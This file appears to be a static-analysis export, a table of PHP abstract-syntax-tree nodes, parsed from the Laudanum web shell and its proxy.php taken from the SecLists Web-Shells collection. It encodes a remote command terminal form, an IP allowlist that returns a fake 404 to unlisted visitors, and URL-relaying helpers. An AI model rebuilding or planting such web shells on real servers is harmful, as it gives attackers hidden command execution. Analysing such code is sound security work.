id:int	labels:label	type	flags:string_array	lineno:int	code	childnum:int	funcid:int	classname	namespace	endlineno:int	name	doccomment
2255	AST	AST_IF		345		3	1287		""			
2256	AST	AST_IF_ELEM		345		0	1287		""			
2257	AST	AST_UNARY_OP	UNARY_BOOL_NOT	345		0	1287		""			
2258	AST	AST_EMPTY		345		0	1287		""			
2259	AST	AST_VAR		345		0	1287		""			
2260	AST	string		345	"username"	0	1287		""			
2261	AST	AST_STMT_LIST		346		1	1287		""			
2262	AST	AST_ECHO		346		0	1287		""			
2263	AST	AST_BINARY_OP	BINARY_CONCAT	346		0	1287		""			
2264	AST	string		346	"  <p class=\"error\">Login failed, please try again:</p>"	0	1287		""			
2265	AST	string		346	"\n"	1	1287		""			
2266	AST	AST_IF_ELEM		348		1	1287		""			
2267	AST	NULL		348		0	1287		""			
2268	AST	AST_STMT_LIST		348		1	1287		""			
2269	AST	AST_ECHO		348		0	1287		""			
2270	AST	string		348	"  <p>Please login:</p>\n"	0	1287		""			
2271	AST	NULL		332		4	1287		""			
2272	AST	AST_ECHO		350		5	1287		""			
2273	AST	string		350	"\n  <p>Username: <input name=\"username\" type=\"text\" value=\""	0	1287		""			
2274	AST	AST_ECHO		351		6	1287		""			
2275	AST	AST_VAR		351		0	1287		""			
2276	AST	string		351	"username"	0	1287		""			
2277	AST	AST_ECHO		352		7	1287		""			
2278	AST	string		352	"\"></p>\n\n  <p>Password: <input name=\"password\" type=\"password\"></p>\n\n  <p><input type=\"submit\" value=\"Login\"></p>\n\n  <input name=\"nounce\" type=\"hidden\" value=\""	0	1287		""			
2279	AST	AST_ECHO		358		8	1287		""			
2280	AST	AST_DIM		358		0	1287		""			
2281	AST	AST_VAR		358		0	1287		""			
2282	AST	string		358	"_SESSION"	0	1287		""			
2283	AST	string		358	"nounce"	1	1287		""			
2284	AST	NULL		332		9	1287		""			
2285	AST	AST_ECHO		358		10	1287		""			
2286	AST	string		358	"\">\n\n</fieldset>\n\n"	0	1287		""			
2287	AST	AST_IF_ELEM		362		1	1287		""			
2288	AST	NULL		362		0	1287		""			
2289	AST	AST_STMT_LIST		362		1	1287		""			
2290	AST	NULL		362		0	1287		""			
2291	AST	AST_ECHO		363		1	1287		""			
2292	AST	string		363	"\n<fieldset>\n  <legend>Current Working Directory: <code>"	0	1287		""			
2293	AST	AST_ECHO		366		2	1287		""			
2294	AST	AST_CALL		366		0	1287		""			
2295	AST	AST_NAME	NAME_NOT_FQ	366		0	1287		""			
2296	AST	string		366	"htmlspecialchars"	0	1287		""			
2297	AST	AST_ARG_LIST		366		1	1287		""			
2298	AST	AST_DIM		366		0	1287		""			
2299	AST	AST_VAR		366		0	1287		""			
2300	AST	string		366	"_SESSION"	0	1287		""			
2301	AST	string		366	"cwd"	1	1287		""			
2302	AST	AST_CONST		366		1	1287		""			
2303	AST	AST_NAME	NAME_NOT_FQ	366		0	1287		""			
2304	AST	string		366	"ENT_COMPAT"	0	1287		""			
2305	AST	string		366	"UTF-8"	2	1287		""			
2306	AST	NULL		362		3	1287		""			
2307	AST	AST_ECHO		367		4	1287		""			
2308	AST	string		367	"</code></legend>\n\n\n<div id=\"terminal\">\n<textarea name=\"output\" readonly=\"readonly\" cols=\""	0	1287		""			
2309	AST	AST_ECHO		371		5	1287		""			
2310	AST	AST_VAR		371		0	1287		""			
2311	AST	string		371	"columns"	0	1287		""			
2312	AST	AST_ECHO		371		6	1287		""			
2313	AST	string		371	"\" rows=\""	0	1287		""			
2314	AST	AST_ECHO		371		7	1287		""			
2315	AST	AST_VAR		371		0	1287		""			
2316	AST	string		371	"rows"	0	1287		""			
2317	AST	AST_ECHO		371		8	1287		""			
2318	AST	string		371	"\">\n"	0	1287		""			
2319	AST	AST_ASSIGN		373		9	1287		""			
2320	AST	AST_VAR		373		0	1287		""			
2321	AST	string		373	"lines"	0	1287		""			
2322	AST	AST_CALL		373		1	1287		""			
2323	AST	AST_NAME	NAME_NOT_FQ	373		0	1287		""			
2324	AST	string		373	"substr_count"	0	1287		""			
2325	AST	AST_ARG_LIST		373		1	1287		""			
2326	AST	AST_DIM		373		0	1287		""			
2327	AST	AST_VAR		373		0	1287		""			
2328	AST	string		373	"_SESSION"	0	1287		""			
2329	AST	string		373	"output"	1	1287		""			
2330	AST	string		373	"\n"	1	1287		""			
2331	AST	AST_ASSIGN		374		10	1287		""			
2332	AST	AST_VAR		374		0	1287		""			
2333	AST	string		374	"padding"	0	1287		""			
2334	AST	AST_CALL		374		1	1287		""			
2335	AST	AST_NAME	NAME_NOT_FQ	374		0	1287		""			
2336	AST	string		374	"str_repeat"	0	1287		""			
2337	AST	AST_ARG_LIST		374		1	1287		""			
2338	AST	string		374	"\n"	0	1287		""			
2339	AST	AST_CALL		374		1	1287		""			
2340	AST	AST_NAME	NAME_NOT_FQ	374		0	1287		""			
2341	AST	string		374	"max"	0	1287		""			
2342	AST	AST_ARG_LIST		374		1	1287		""			
2343	AST	integer		374	0	0	1287		""			
2344	AST	AST_BINARY_OP	BINARY_SUB	374		1	1287		""			
2345	AST	AST_BINARY_OP	BINARY_ADD	374		0	1287		""			
2346	AST	AST_VAR		374		0	1287		""			
2347	AST	string		374	"rows"	0	1287		""			
2348	AST	integer		374	1	1	1287		""			
2349	AST	AST_VAR		374		1	1287		""			
2350	AST	string		374	"lines"	0	1287		""			
2351	AST	AST_ECHO		375		11	1287		""			
2352	AST	AST_CALL		375		0	1287		""			
2353	AST	AST_NAME	NAME_NOT_FQ	375		0	1287		""			
2354	AST	string		375	"rtrim"	0	1287		""			
2355	AST	AST_ARG_LIST		375		1	1287		""			
2356	AST	AST_BINARY_OP	BINARY_CONCAT	375		0	1287		""			
2357	AST	AST_VAR		375		0	1287		""			
2358	AST	string		375	"padding"	0	1287		""			
2359	AST	AST_DIM		375		1	1287		""			
2360	AST	AST_VAR		375		0	1287		""			
2361	AST	string		375	"_SESSION"	0	1287		""			
2362	AST	string		375	"output"	1	1287		""			
2363	AST	NULL		362		12	1287		""			
2364	AST	AST_ECHO		377		13	1287		""			
2365	AST	string		377	"</textarea>\n<p id=\"prompt\">\n  $&nbsp;<input name=\"command\" type=\"text\"\n                onkeyup=\"key(event)\" size=\""	0	1287		""			
2366	AST	AST_ECHO		380		14	1287		""			
2367	AST	AST_BINARY_OP	BINARY_SUB	380		0	1287		""			
2368	AST	AST_VAR		380		0	1287		""			
2369	AST	string		380	"columns"	0	1287		""			
2370	AST	integer		380	2	1	1287		""			
2371	AST	AST_ECHO		380		15	1287		""			
2372	AST	string		380	"\" tabindex=\"1\">\n</p>\n</div>\n\n<p>\n  <span style=\"float: right\">Size: <input type=\"text\" name=\"rows\" size=\"2\"\n  maxlength=\"3\" value=\""	0	1287		""			
2373	AST	AST_ECHO		386		16	1287		""			
2374	AST	AST_VAR		386		0	1287		""			
2375	AST	string		386	"rows"	0	1287		""			
2376	AST	AST_ECHO		386		17	1287		""			
2377	AST	string		386	"\"> &times; <input type=\"text\"\n  name=\"columns\" size=\"2\" maxlength=\"3\" value=\""	0	1287		""			
2378	AST	AST_ECHO		387		18	1287		""			
2379	AST	AST_VAR		387		0	1287		""			
2380	AST	string		387	"columns"	0	1287		""			
2381	AST	AST_ECHO		388		19	1287		""			
2382	AST	string		388	"\"></span>\n  \n<input type=\"submit\" value=\"Execute Command\">\n  <input type=\"submit\" name=\"logout\" value=\"Logout\">\n</p>\n\n</fieldset>\n\n"	0	1287		""			
2383	AST	NULL		1		29	1287		""			
2384	AST	AST_ECHO		397		30	1287		""			
2385	AST	string		397	"\n</form>\n\n\n  <hr/>\n  <address>\n  Copyright &copy; 2012, <a href=\"mailto:[email]\">Kevin Johnson</a> and the Laudanum team.<br/>\n  Updated by Tim Medin.<br/>\n  Get the latest version at <a href=\"http://laudanum.secureideas.net\">laudanum.secureideas.net</a>.\n  </address>\n\n</body>\n</html>\n"	0	1287		""			
2386	Filesystem	File									"proxy.php"	
2387	AST	AST_TOPLEVEL	TOPLEVEL_FILE	1					""	351	"/data/seongil/26529,danielmiessler,SecLists/code/Web-Shells/laudanum-0.8/php/proxy.php"	
2388	Artificial	CFG_FUNC_ENTRY					2387				"/data/seongil/26529,danielmiessler,SecLists/code/Web-Shells/laudanum-0.8/php/proxy.php"	
2389	Artificial	CFG_FUNC_EXIT					2387				"/data/seongil/26529,danielmiessler,SecLists/code/Web-Shells/laudanum-0.8/php/proxy.php"	
2390	AST	AST_STMT_LIST		1		0	2387		""			
2391	AST	AST_CALL		2		0	2387		""			
2392	AST	AST_NAME	NAME_NOT_FQ	2		0	2387		""			
2393	AST	string		2	"ini_set"	0	2387		""			
2394	AST	AST_ARG_LIST		2		1	2387		""			
2395	AST	string		2	"session.use_cookies"	0	2387		""			
2396	AST	string		2	"0"	1	2387		""			
2397	AST	AST_ASSIGN		47		1	2387		""			
2398	AST	AST_VAR		47		0	2387		""			
2399	AST	string		47	"allowedIPs"	0	2387		""			
2400	AST	AST_ARRAY	"[WARNING] Unexpected flags for kind: kind=129 and flags=2"	47		1	2387		""			
2401	AST	AST_ARRAY_ELEM		47		0	2387		""			
2402	AST	string		47	"19.168.2.16"	0	2387		""			
2403	AST	NULL		47		1	2387		""			
2404	AST	AST_ARRAY_ELEM		47		1	2387		""			
2405	AST	string		47	"192.168.1.100"	0	2387		""			
2406	AST	NULL		47		1	2387		""			
2407	AST	AST_ARRAY_ELEM		47		2	2387		""			
2408	AST	string		47	"127.0.0.1"	0	2387		""			
2409	AST	NULL		47		1	2387		""			
2410	AST	AST_ARRAY_ELEM		47		3	2387		""			
2411	AST	string		47	"192.168.10.129"	0	2387		""			
2412	AST	NULL		47		1	2387		""			
2413	AST	AST_ARRAY_ELEM		47		4	2387		""			
2414	AST	string		47	"192.168.10.1"	0	2387		""			
2415	AST	NULL		47		1	2387		""			
2416	AST	AST_ASSIGN		51		2	2387		""			
2417	AST	AST_VAR		51		0	2387		""			
2418	AST	string		51	"allowed"	0	2387		""			
2419	AST	integer		51	0	1	2387		""			
2420	AST	AST_FOREACH		52		3	2387		""			
2421	AST	AST_VAR		52		0	2387		""			
2422	AST	string		52	"allowedIPs"	0	2387		""			
2423	AST	AST_VAR		52		1	2387		""			
2424	AST	string		52	"IP"	0	2387		""			
2425	AST	NULL		52		2	2387		""			
2426	AST	AST_STMT_LIST		52		3	2387		""			
2427	AST	AST_IF		53		0	2387		""			
2428	AST	AST_IF_ELEM		53		0	2387		""			
2429	AST	AST_BINARY_OP	BINARY_IS_EQUAL	53		0	2387		""			
2430	AST	AST_DIM		53		0	2387		""			
2431	AST	AST_VAR		53		0	2387		""			
2432	AST	string		53	"_SERVER"	0	2387		""			
2433	AST	string		53	"REMOTE_ADDR"	1	2387		""			
2434	AST	AST_VAR		53		1	2387		""			
2435	AST	string		53	"IP"	0	2387		""			
2436	AST	AST_ASSIGN		54		1	2387		""			
2437	AST	AST_VAR		54		0	2387		""			
2438	AST	string		54	"allowed"	0	2387		""			
2439	AST	integer		54	1	1	2387		""			
2440	AST	AST_IF		57		4	2387		""			
2441	AST	AST_IF_ELEM		57		0	2387		""			
2442	AST	AST_BINARY_OP	BINARY_IS_EQUAL	57		0	2387		""			
2443	AST	AST_VAR		57		0	2387		""			
2444	AST	string		57	"allowed"	0	2387		""			
2445	AST	integer		57	0	1	2387		""			
2446	AST	AST_STMT_LIST		57		1	2387		""			
2447	AST	AST_CALL		58		0	2387		""			
2448	AST	AST_NAME	NAME_NOT_FQ	58		0	2387		""			
2449	AST	string		58	"header"	0	2387		""			
2450	AST	AST_ARG_LIST		58		1	2387		""			
2451	AST	string		58	"HTTP/1.0 404 Not Found"	0	2387		""			
2452	AST	AST_EXIT		59		1	2387		""			
2453	AST	NULL		59		0	2387		""			
2454	AST	AST_FUNC_DECL		64		5	2387		""	92	error_handler	
2455	Artificial	CFG_FUNC_ENTRY					2454		""		"error_handler"	
2456	Artificial	CFG_FUNC_EXIT					2454		""		"error_handler"	
2457	AST	AST_PARAM_LIST		64		0	2454		""			
2458	AST	AST_PARAM		64		0	2454		""			
2459	AST	NULL		64		0	2454		""			
2460	AST	string		64	"errno"	1	2454		""			
2461	AST	NULL		64		2	2454		""			
2462	AST	AST_PARAM		64		1	2454		""			
2463	AST	NULL		64		0	2454		""			
2464	AST	string		64	"errstr"	1	2454		""			
2465	AST	NULL		64		2	2454		""			
2466	AST	AST_PARAM		64		2	2454		""			
2467	AST	NULL		64		0	2454		""			
2468	AST	string		64	"errfile"	1	2454		""			
2469	AST	NULL		64		2	2454		""			
2470	AST	AST_PARAM		64		3	2454		""			
2471	AST	NULL		64		0	2454		""			
2472	AST	string		64	"errline"	1	2454		""			
2473	AST	NULL		64		2	2454		""			
2474	AST	AST_PARAM		64		4	2454		""			
2475	AST	NULL		64		0	2454		""			
2476	AST	string		64	"errcontext"	1	2454		""			
2477	AST	NULL		64		2	2454		""			
2478	AST	NULL		64		1	2454		""			
2479	AST	AST_STMT_LIST		64		2	2454		""			
2480	AST	AST_IF		68		0	2454		""			
2481	AST	AST_IF_ELEM		68		0	2454		""			
2482	AST	AST_BINARY_OP	BINARY_IS_EQUAL	68		0	2454		""			
2483	AST	AST_CALL		68		0	2454		""			
2484	AST	AST_NAME	NAME_NOT_FQ	68		0	2454		""			
2485	AST	string		68	"error_reporting"	0	2454		""			
2486	AST	AST_ARG_LIST		68		1	2454		""			
2487	AST	integer		68	0	1	2454		""			
2488	AST	AST_STMT_LIST		68		1	2454		""			
2489	AST	AST_ASSIGN_OP	BINARY_CONCAT	69		0	2454		""			
2490	AST	AST_DIM		69		0	2454		""			
2491	AST	AST_VAR		69		0	2454		""			
2492	AST	string		69	"_SESSION"	0	2454		""			
2493	AST	string		69	"output"	1	2454		""			
2494	AST	AST_BINARY_OP	BINARY_CONCAT	69		1	2454		""			
2495	AST	AST_VAR		69		0	2454		""			
2496	AST	string		69	"errstr"	0	2454		""			
2497	AST	string		69	"\n"	1	2454		""			
2498	AST	AST_IF_ELEM		70		1	2454		""			
2499	AST	NULL		70		0	2454		""			
2500	AST	AST_STMT_LIST		70		1	2454		""			
2501	AST	AST_EXIT		71		0	2454		""			
2502	AST	AST_BINARY_OP	BINARY_CONCAT	71		0	2454		""			
2503	AST	AST_BINARY_OP	BINARY_CONCAT	71		0	2454		""			
2504	AST	AST_BINARY_OP	BINARY_CONCAT	71		0	2454		""			
2505	AST	AST_BINARY_OP	BINARY_CONCAT	71		0	2454		""			
2506	AST	AST_BINARY_OP	BINARY_CONCAT	71		0	2454		""			
2507	AST	AST_BINARY_OP	BINARY_CONCAT	71		0	2454		""			
2508	AST	string		71	"<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\"\n   \"http://www.w3.org/TR/html4/strict.dtd\">\n<html>\n<head>\n  <title>Laudanum PHP Proxy</title>\n</head>\n<body>\n  <h1>Fatal Error!</h1>\n  <p><b>"	0	2454		""			
2509	AST	AST_VAR		79		1	2454		""			
2510	AST	string		79	"errstr"	0	2454		""			
2511	AST	string		71	"</b></p>\n  <p>in <b>"	1	2454		""			
2512	AST	AST_VAR		80		1	2454		""			
2513	AST	string		80	"errfile"	0	2454		""			
2514	AST	string		71	"</b>, line <b>"	1	2454		""			
2515	AST	AST_VAR		80		1	2454		""			
2516	AST	string		80	"errline"	0	2454		""			
2517	AST	string		71	"</b>.</p>\n\n  <hr>\n  <address>\n  Copyright &copy; 2012, <a href=\"mailto:[email]\">Kevin Johnson</a> and the Laudanum team.<br/>\n  Written by Tim Medin.<br/>\n  Get the latest version at <a href=\"http://laudanum.secureideas.net\">laudanum.secureideas.net</a>.\n  </address>\n\n</body>\n</html>"	1	2454		""			
2518	AST	NULL		64		3	2454		""			
2519	AST	AST_CALL		94		6	2387		""			
2520	AST	AST_NAME	NAME_NOT_FQ	94		0	2387		""			
2521	AST	string		94	"set_error_handler"	0	2387		""			
2522	AST	AST_ARG_LIST		94		1	2387		""			
2523	AST	string		94	"error_handler"	0	2387		""			
2524	AST	AST_FUNC_DECL		96		7	2387		""	102	geturlarray	
2525	Artificial	CFG_FUNC_ENTRY					2524		""		"geturlarray"	
2526	Artificial	CFG_FUNC_EXIT					2524		""		"geturlarray"	
2527	AST	AST_PARAM_LIST		96		0	2524		""			
2528	AST	AST_PARAM		96		0	2524		""			
2529	AST	NULL		96		0	2524		""			
2530	AST	string		96	"u"	1	2524		""			
2531	AST	NULL		96		2	2524		""			
2532	AST	NULL		96		1	2524		""			
2533	AST	AST_STMT_LIST		96		2	2524		""			
2534	AST	AST_ASSIGN		98		0	2524		""			
2535	AST	AST_VAR		98		0	2524		""			
2536	AST	string		98	"o"	0	2524		""			
2537	AST	AST_CALL		98		1	2524		""			
2538	AST	AST_NAME	NAME_NOT_FQ	98		0	2524		""			
2539	AST	string		98	"parse_url"	0	2524		""			
2540	AST	AST_ARG_LIST		98		1	2524		""			
2541	AST	AST_VAR		98		0	2524		""			
2542	AST	string		98	"u"	0	2524		""			
2543	AST	AST_IF		99		1	2524		""			
2544	AST	AST_IF_ELEM		99		0	2524		""			
2545	AST	AST_UNARY_OP	UNARY_BOOL_NOT	99		0	2524		""			
2546	AST	AST_ISSET		99		0	2524		""			
2547	AST	AST_DIM		99		0	2524		""			
2548	AST	AST_VAR		99		0	2524		""			
2549	AST	string		99	"o"	0	2524		""			
2550	AST	string		99	"scheme"	1	2524		""			
2551	AST	AST_STMT_LIST		99		1	2524		""			
2552	AST	AST_ASSIGN		99		0	2524		""			
2553	AST	AST_VAR		99		0	2524		""			
2554	AST	string		99	"o"	0	2524		""			
2555	AST	AST_CALL		99		1	2524		""			
2556	AST	AST_NAME	NAME_NOT_FQ	99		0	2524		""			
2557	AST	string		99	"parse_url"	0	2524		""			
2558	AST	AST_ARG_LIST		99		1	2524		""			
2559	AST	AST_BINARY_OP	BINARY_CONCAT	99		0	2524		""			
2560	AST	string		99	"http://"	0	2524		""			
2561	AST	AST_VAR		99		1	2524		""			
2562	AST	string		99	"u"	0	2524		""			
2563	AST	AST_IF		100		2	2524		""			
2564	AST	AST_IF_ELEM		100		0	2524		""			
2565	AST	AST_UNARY_OP	UNARY_BOOL_NOT	100		0	2524		""			
2566	AST	AST_ISSET		100		0	2524		""			
2567	AST	AST_DIM		100		0	2524		""			
2568	AST	AST_VAR		100		0	2524		""			
2569	AST	string		100	"o"	0	2524		""			
2570	AST	string		100	"path"	1	2524		""			
2571	AST	AST_STMT_LIST		100		1	2524		""			
2572	AST	AST_ASSIGN		100		0	2524		""			
2573	AST	AST_DIM		100		0	2524		""			
2574	AST	AST_VAR		100		0	2524		""			
2575	AST	string		100	"o"	0	2524		""			
2576	AST	string		100	"path"	1	2524		""			
2577	AST	string		100	"/"	1	2524		""			
2578	AST	AST_RETURN		101		3	2524		""			
2579	AST	AST_VAR		101		0	2524		""			
2580	AST	string		101	"o"	0	2524		""			
2581	AST	NULL		96		3	2524		""			
2582	AST	AST_FUNC_DECL		104		8	2387		""	117	buildurl	
2583	Artificial	CFG_FUNC_ENTRY					2582		""		"buildurl"	
2584	Artificial	CFG_FUNC_EXIT					2582		""		"buildurl"	
2585	AST	AST_PARAM_LIST		104		0	2582		""			
2586	AST	AST_PARAM		104		0	2582		""			
2587	AST	NULL		104		0	2582		""			
2588	AST	string		104	"u"	1	2582		""			
2589	AST	NULL		104		2	2582		""			
2590	AST	NULL		104		1	2582		""			
2591	AST	AST_STMT_LIST		104		2	2582		""			
2592	AST	AST_IF		108		0	2582		""			
2593	AST	AST_IF_ELEM		108		0	2582		""			
2594	AST	AST_UNARY_OP	UNARY_BOOL_NOT	108		0	2582		""			
2595	AST	AST_ISSET		108		0	2582		""			
2596	AST	AST_DIM		108		0	2582		""			
2597	AST	AST_VAR		108		0	2582		""			
2598	AST	string		108	"u"	0	2582		""			
2599	AST	string		108	"host"	1	2582		""			
2600	AST	AST_STMT_LIST		108		1	2582		""			
2601	AST	AST_RETURN		108		0	2582		""			
2602	AST	AST_CONST		108		0	2582		""			
2603	AST	AST_NAME	NAME_NOT_FQ	108		0	2582		""			
2604	AST	string		108	"null"	0	2582		""			
2605	AST	AST_ASSIGN		110		1	2582		""			
2606	AST	AST_VAR		110		0	2582		""			
2607	AST	string		110	"s"	0	2582		""			
2608	AST	AST_CONDITIONAL		110		1	2582		""			
2609	AST	AST_ISSET		110		0	2582		""			
2610	AST	AST_DIM		110		0	2582		""			
2611	AST	AST_VAR		110		0	2582		""			
2612	AST	string		110	"u"	0	2582		""			
2613	AST	string		110	"scheme"	1	2582		""			
2614	AST	AST_DIM		110		1	2582		""			
2615	AST	AST_VAR		110		0	2582		""			
2616	AST	string		110	"u"	0	2582		""			
2617	AST	string		110	"scheme"	1	2582		""			
2618	AST	string		110	"http"	2	2582		""			
2619	AST	AST_ASSIGN_OP	BINARY_CONCAT	111		2	2582		""			
2620	AST	AST_VAR		111		0	2582		""			
2621	AST	string		111	"s"	0	2582		""			
2622	AST	AST_BINARY_OP	BINARY_CONCAT	111		1	2582		""			
2623	AST	string		111	"://"	0	2582		""			
2624	AST	AST_DIM		111		1	2582		""			
2625	AST	AST_VAR		111		0	2582		""			
2626	AST	string		111	"u"	0	2582		""			
2627	AST	string		111	"host"	1	2582		""			
2628	AST	AST_ASSIGN_OP	BINARY_CONCAT	112		3	2582		""			
2629	AST	AST_VAR		112		0	2582		""			
2630	AST	string		112	"s"	0	2582		""			
2631	AST	AST_CONDITIONAL		112		1	2582		""			
2632	AST	AST_ISSET		112		0	2582		""			
2633	AST	AST_DIM		112		0	2582		""			
2634	AST	AST_VAR		112		0	2582		""			
2635	AST	string		112	"u"	0	2582		""			
2636	AST	string		112	"port"	1	2582		""			
2637	AST	AST_BINARY_OP	BINARY_CONCAT	112		1	2582		""			
2638	AST	string		112	":"	0	2582		""			
2639	AST	AST_DIM		112		1	2582		""			
2640	AST	AST_VAR		112		0	2582		""			
2641	AST	string		112	"u"	0	2582		""			
2642	AST	string		112	"port"	1	2582		""			
2643	AST	string		112	""	2	2582		""			
2644	AST	AST_ASSIGN_OP	BINARY_CONCAT	113		4	2582		""			
2645	AST	AST_VAR		113		0	2582		""			
2646	AST	string		113	"s"	0	2582		""			
2647	AST	AST_CONDITIONAL		113		1	2582		""			
2648	AST	AST_ISSET		113		0	2582		""			
2649	AST	AST_DIM		113		0	2582		""			
2650	AST	AST_VAR		113		0	2582		""			
2651	AST	string		113	"u"	0	2582		""			
2652	AST	string		113	"path"	1	2582		""			
2653	AST	AST_DIM		113		1	2582		""			
2654	AST	AST_VAR		113		0	2582		""			
2655	AST	string		113	"u"	0	2582		""			
2656	AST	string		113	"path"	1	2582		""			
2657	AST	string		113	"/"	2	2582		""			
2658	AST	AST_ASSIGN_OP	BINARY_CONCAT	114		5	2582		""			
2659	AST	AST_VAR		114		0	2582		""			
2660	AST	string		114	"s"	0	2582		""			
2661	AST	AST_CONDITIONAL		114		1	2582		""			
2662	AST	AST_ISSET		114		0	2582		""			
2663	AST	AST_DIM		114		0	2582		""			
2664	AST	AST_VAR		114		0	2582		""			
2665	AST	string		114	"u"	0	2582		""			
2666	AST	string		114	"query"	1	2582		""			
2667	AST	AST_BINARY_OP	BINARY_CONCAT	114		1	2582		""			
2668	AST	string		114	"?"	0	2582		""			
2669	AST	AST_DIM		114		1	2582		""			
2670	AST	AST_VAR		114		0	2582		""			
2671	AST	string		114	"u"	0	2582		""			
2672	AST	string		114	"query"	1	2582		""			
2673	AST	string		114	""	2	2582		""			
2674	AST	AST_ASSIGN_OP	BINARY_CONCAT	115		6	2582		""			
2675	AST	AST_VAR		115		0	2582		""			
2676	AST	string		115	"s"	0	2582		""			
2677	AST	AST_CONDITIONAL		115		1	2582		""			
2678	AST	AST_ISSET		115		0	2582		""			
2679	AST	AST_DIM		115		0	2582		""			
2680	AST	AST_VAR		115		0	2582		""			
2681	AST	string		115	"u"	0	2582		""			
2682	AST	string		115	"fragment"	1	2582		""			
2683	AST	AST_BINARY_OP	BINARY_CONCAT	115		1	2582		""			
2684	AST	string		115	"#"	0	2582		""			
2685	AST	AST_DIM		115		1	2582		""			
2686	AST	AST_VAR		115		0	2582		""			
2687	AST	string		115	"u"	0	2582		""			
2688	AST	string		115	"fragment"	1	2582		""			
2689	AST	string		115	""	2	2582		""			
2690	AST	AST_RETURN		116		7	2582		""			
2691	AST	AST_VAR		116		0	2582		""			
2692	AST	string		116	"s"	0	2582		""			
2693	AST	NULL		104		3	2582		""			
2694	AST	AST_FUNC_DECL		119		9	2387		""	142	buildurlpath	
2695	Artificial	CFG_FUNC_ENTRY					2694		""		"buildurlpath"	
2696	Artificial	CFG_FUNC_EXIT					2694		""		"buildurlpath"	
2697	AST	AST_PARAM_LIST		119		0	2694		""			
2698	AST	AST_PARAM		119		0	2694		""			
2699	AST	NULL		119		0	2694		""			
2700	AST	string		119	"u"	1	2694		""			
2701	AST	NULL		119		2	2694		""			
2702	AST	NULL		119		1	2694		""			
2703	AST	AST_STMT_LIST		119		2	2694		""			
2704	AST	AST_IF		122		0	2694		""			
2705	AST	AST_IF_ELEM		122		0	2694		""			
2706	AST	AST_UNARY_OP	UNARY_BOOL_NOT	122		0	2694		""			
2707	AST	AST_ISSET		122		0	2694		""			
2708	AST	AST_DIM		122		0	2694		""			
2709	AST	AST_VAR		122		0	2694		""			
2710	AST	string		122	"u"	0	2694		""			
2711	AST	string		122	"host"	1	2694		""			
2712	AST	AST_STMT_LIST		122		1	2694		""			
2713	AST	AST_RETURN		122		0	2694		""			
2714	AST	AST_CONST		122		0	2694		""			
2715	AST	AST_NAME	NAME_NOT_FQ	122		0	2694		""			
2716	AST	string		122	"null"	0	2694		""			
2717	AST	AST_ASSIGN		124		1	2694		""			
2718	AST	AST_VAR		124		0	2694		""			
2719	AST	string		124	"s"	0	2694		""			
2720	AST	AST_CONDITIONAL		124		1	2694		""			
2721	AST	AST_ISSET		124		0	2694		""			
2722	AST	AST_DIM		124		0	2694		""			
2723	AST	AST_VAR		124		0	2694		""			
2724	AST	string		124	"u"	0	2694		""			
2725	AST	string		124	"scheme"	1	2694		""			
2726	AST	AST_DIM		124		1	2694		""			
2727	AST	AST_VAR		124		0	2694		""			
2728	AST	string		124	"u"	0	2694		""			
2729	AST	string		124	"scheme"	1	2694		""			
2730	AST	string		124	"http"	2	2694		""			
2731	AST	AST_ASSIGN_OP	BINARY_CONCAT	125		2	2694		""			
2732	AST	AST_VAR		125		0	2694		""			
2733	AST	string		125	"s"	0	2694		""			
2734	AST	AST_BINARY_OP	BINARY_CONCAT	125		1	2694		""			
2735	AST	string		125	"://"	0	2694		""			
2736	AST	AST_DIM		125		1	2694		""			
2737	AST	AST_VAR		125		0	2694		""			
2738	AST	string		125	"u"	0	2694		""			
2739	AST	string		125	"host"	1	2694		""			
2740	AST	AST_ASSIGN_OP	BINARY_CONCAT	126		3	2694		""			
2741	AST	AST_VAR		126		0	2694		""			
2742	AST	string		126	"s"	0	2694		""			
2743	AST	AST_CONDITIONAL		126		1	2694		""			
2744	AST	AST_ISSET		126		0	2694		""			
2745	AST	AST_DIM		126		0	2694		""			
2746	AST	AST_VAR		126		0	2694		""			
2747	AST	string		126	"u"	0	2694		""			
2748	AST	string		126	"port"	1	2694		""			
2749	AST	AST_BINARY_OP	BINARY_CONCAT	126		1	2694		""			
2750	AST	string		126	":"	0	2694		""			
2751	AST	AST_DIM		126		1	2694		""			
2752	AST	AST_VAR		126		0	2694		""			
2753	AST	string		126	"u"	0	2694		""			
2754	AST	string		126	"port"	1	2694		""			
2755	AST	string		126	""	2	2694		""			
2756	AST	AST_ASSIGN		128		4	2694		""			
2757	AST	AST_VAR		128		0	2694		""			
2758	AST	string		128	"path"	0	2694		""			
2759	AST	AST_CONDITIONAL		128		1	2694		""			
